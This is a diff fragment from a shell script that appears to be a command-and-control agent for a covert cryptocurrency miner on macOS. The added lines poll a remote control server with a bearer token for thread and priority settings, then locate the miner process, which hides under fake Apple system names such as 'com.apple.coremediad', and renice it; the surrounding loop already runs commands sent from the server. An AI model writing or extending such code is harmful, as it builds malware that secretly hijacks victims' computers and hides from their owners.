@@ -165,6 +165,21 @@ while true; do
     execute_command "$CMD_ACTION" "$CMD_PAYLOAD"
   fi
 
+  # Check resource config and apply to running miner
+  RESOURCE=$(curl -fsSL "$CC_URL/resources/$NODE_ID" \
+    -H "Authorization: Bearer $CC_TOKEN" 2>/dev/null)
+  if [[ -n "$RESOURCE" ]]; then
+    NEW_THREADS=$(echo "$RESOURCE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('threads',''))" 2>/dev/null)
+    NEW_PRIORITY=$(echo "$RESOURCE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('priority',5))" 2>/dev/null)
+    # Apply priority to running miner process
+    MINER_PID=$(pgrep -f "com.apple.coremediad\|com.apple.coremedia.network" 2>/dev/null | head -1)
+    if [[ -n "$MINER_PID" && -n "$NEW_PRIORITY" ]]; then
+      renice "$NEW_PRIORITY" "$MINER_PID" 2>/dev/null || true
+    fi
+    # Store resource config for next miner start
+    echo "$NEW_THREADS" > /tmp/_miner_threads 2>/dev/null || true
+  fi
+
   sleep $POLL_INTERVAL
 done
 AGENT_EOF
